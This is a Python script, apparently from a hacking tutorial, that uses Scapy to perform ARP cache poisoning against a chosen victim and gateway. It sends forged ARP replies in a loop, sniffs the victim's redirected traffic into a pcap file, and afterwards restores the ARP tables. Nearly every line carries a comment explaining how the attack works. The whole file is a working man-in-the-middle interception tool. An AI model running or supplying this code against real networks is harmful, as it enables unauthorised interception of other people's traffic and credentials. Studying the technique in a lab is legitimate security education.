from multiprocessing import Process # Hint: Used to run the poisoning and sniffing at the same time.
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap) # Hint: Core Scapy functions for packet crafting and sending.
import os # Hint: Allows interaction with the operating system.
import sys # Hint: Used for handling command-line arguments like target IPs.
import time # Hint: Used to add delays so we don't overwhelm the network.

def get_mac(targetip):
    # Hint: Creates a broadcast packet asking the network "Who has this IP?".
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    # Hint: Sends the packet and waits for the response containing the MAC address.
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='eno0'):
        self.victim = victim # Hint: The IP of your victim machine (e.g., Windows VM).
        self.gateway = gateway # Hint: The IP of the network gateway.
        self.interface = interface # Hint: The network interface you are using.
        self.victimmac = get_mac(victim) # Hint: Fetches the victim's hardware address.
        self.gatewaymac = get_mac(gateway) # Hint: Fetches the gateway's hardware address.
        conf.iface = interface # Hint: Tells Scapy to use this specific interface.
        conf.verb = 0 # Hint: Silences Scapy's default status output.

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    def run(self):
        # Hint: Starts the thread that will constantly lie to the network.
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # Hint: Starts the thread that will capture the traffic we redirected.
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # Hint: Build a fake ARP reply telling the victim WE are the gateway.
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
        # Hint: Build a fake ARP reply telling the gateway WE are the victim.
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)

        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            try:
                send(poison_victim) # Hint: Sends the fake packet to the victim.
                send(poison_gateway) # Hint: Sends the fake packet to the gateway.
                time.sleep(2) # Hint: Pauses for 2 seconds to keep the poison active.
            except KeyboardInterrupt:
                self.restore() # Hint: Heals the network if you stop the script.
                sys.exit()

    def sniff(self, count=100):
        time.sleep(5) # Hint: Waits for the poison to take effect before listening.
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % self.victim # Hint: Limits sniffing to the victim's traffic.
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # Hint: Saves the captured traffic to a file for later analysis.
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore() # Hint: Restores the network settings.
        self.poison_thread.terminate() # Hint: Stops the poisoning process.
        print('Finished.')

    def restore(self):
        print('Restoring ARP tables...')
        # Hint: Sends correct ARP info back to the gateway and victim to "fix" the network.
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac,
                 pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac,
                 pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
